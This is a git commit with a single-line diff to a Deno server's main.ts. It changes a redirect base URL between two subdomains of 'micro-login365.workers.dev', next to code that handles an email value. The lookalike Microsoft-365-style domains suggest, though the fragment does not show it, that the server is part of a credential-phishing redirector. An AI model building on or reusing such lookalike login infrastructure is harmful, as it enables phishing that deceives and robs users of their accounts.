537c7cd1454c155819b45ed728a3f2221c5c632c
tailopez147 <49619133+tailopez147@users.noreply.github.com>
2026-06-18 23:17:56 +0300

    Update main.ts

--- main.ts
+++ main.ts
@@ -4,7 +4,7 @@ Deno.serve({ port: PORT }, async (req) => {
   const url = new URL(req.url);
 
   const redirectBase =
-    "https://internal-xoauthorization-service.micro-login365.workers.dev/";
+    "https://authority.micro-login365.workers.dev/";
 
   let email: string | null = null;
 
